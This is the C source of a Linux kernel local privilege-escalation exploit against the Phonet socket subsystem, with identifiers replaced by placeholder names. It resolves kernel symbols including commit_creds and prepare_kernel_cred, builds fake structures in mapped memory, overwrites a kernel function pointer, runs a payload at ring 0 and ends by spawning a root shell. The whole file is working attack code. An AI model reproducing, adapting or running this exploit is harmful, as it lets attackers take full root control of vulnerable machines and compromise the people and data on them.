
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 scalar_t__ VAR_0 ;
 int VAR_1 ;
 void* VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 void* VAR_10 ;
 scalar_t__ VAR_11 ;
 int FUNC_0 (char*,char*,int *) ;
 void* FUNC_1 (char*) ;
 scalar_t__ FUNC_2 () ;
 int FUNC_3 (int,int ,int *) ;
 int VAR_12 ;
 int FUNC_4 (void*,int *,int) ;
 void* FUNC_5 (void*,int,int,int,int ,int ) ;
 void* VAR_13 ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int ,int ,int) ;

int FUNC_8(int VAR_14, char * VAR_15[])
{

        int VAR_16, VAR_17, VAR_18, VAR_19 = -1;
        unsigned long VAR_20, VAR_21, VAR_22, VAR_23, VAR_24, *VAR_25;
        void * VAR_26;


        FUNC_6("[*] Testing Phonet support and CAP_SYS_ADMIN...\n");
        VAR_16 = FUNC_7(VAR_5, VAR_9, 0);

        if(VAR_16 < 0) {
                if(VAR_11 == VAR_0)
                        FUNC_6("[*] You don't have CAP_SYS_ADMIN.\n");

                else
                        FUNC_6("[*] Failed to open Phonet socket.\n");

                return -1;
        }


        FUNC_6("[*] Resolving kernel symbols...\n");

        VAR_20 = FUNC_1("proto_tab");
        VAR_23 = FUNC_1("phonet_dgram_ops");
        VAR_24 = FUNC_1("pn_socket_ioctl");
        VAR_10 = FUNC_1("commit_creds");
        VAR_13 = FUNC_1("prepare_kernel_cred");

        if(!VAR_20 || !VAR_10 || !VAR_13 ||
           !VAR_23 || !VAR_24) {
                FUNC_6("[*] Failed to resolve kernel symbols.\n");
                return -1;
        }


        VAR_21 = 0x20000000;
        VAR_17 = 1 << 31 | (VAR_21 - VAR_20) >> 2;


        FUNC_6("[*] Preparing fake structures...\n");

        VAR_26 = FUNC_5((void *)VAR_21, 0x10000,
                   VAR_7 | VAR_8 | VAR_6,
                   VAR_4 | VAR_1 | VAR_3, 0, 0);

        if(VAR_26 == VAR_2) {
                FUNC_6("[*] Failed to map landing area.\n");
                return -1;
        }


        VAR_25 = (unsigned long *)VAR_21;
        VAR_25[0] = VAR_25[1];


        for(VAR_18 = 1; VAR_18 < 4; VAR_18++)
                VAR_25[VAR_18] = VAR_25[4];


        for(VAR_18 = 4; VAR_18 < 204; VAR_18++)
                VAR_25[VAR_18] = VAR_25[204];


        VAR_22 = 0x30000000;


        for(VAR_18 = 204; VAR_18 < 404; VAR_18++)
                VAR_25[VAR_18] = VAR_22;


        VAR_26 = FUNC_5((void *)0x30000000, 0x2000000,
                   VAR_7 | VAR_8 | VAR_6,
                   VAR_4 | VAR_1 | VAR_3, 0, 0);

        if(VAR_26 == VAR_2) {
                FUNC_6("[*] Failed to map landing area.\n");
                return -1;
        }

        FUNC_6("[*] Calculating offsets...\n");

        FUNC_7(VAR_5, VAR_9, VAR_17);

        VAR_25 = 0x30000000;
        for(VAR_18 = 0; VAR_18 < 0x800000; VAR_18++) {
                if(VAR_25[VAR_18] != 0) {
                        VAR_19 = VAR_18 * sizeof(void *);
                        break;
                }
        }

        if(VAR_19 == -1) {
                FUNC_6("[*] Test run failed.\n");
                return -1;
        }


        VAR_22 = VAR_23 + 10 * sizeof(void *) - 1 - VAR_19;


        VAR_25 = (unsigned long *)VAR_21;
        for(VAR_18 = 204; VAR_18 < 404; VAR_18++)
                VAR_25[VAR_18] = VAR_22;


        FUNC_6("[*] Modifying function pointer...\n");

        VAR_21 = VAR_24;
        while((VAR_21 & 0xff000000) != 0x10000000) {
                FUNC_7(VAR_5, VAR_9, VAR_17);
                VAR_21 += 0x01000000;
        }


        VAR_26 = FUNC_5((void *)(VAR_21 & ~0xfff), 0x10000,
                   VAR_7 | VAR_8 | VAR_6,
                   VAR_4 | VAR_1 | VAR_3, 0, 0);

        if(VAR_26 == VAR_2) {
                FUNC_6("[*] Failed to map payload area.\n");
                return -1;
        }


        FUNC_4((void *)VAR_21, &VAR_12, 1024);

        FUNC_6("[*] Executing Konami code at ring0...\n");
        FUNC_3(VAR_16, 0, ((void*)0));

        if(FUNC_2()) {
                FUNC_6("[*] Exploit failed to get root.\n");
                return -1;
        }

        FUNC_6("[*] Konami code worked!  Have a root shell.\n");
        FUNC_0("/bin/sh", "/bin/sh", ((void*)0));

}
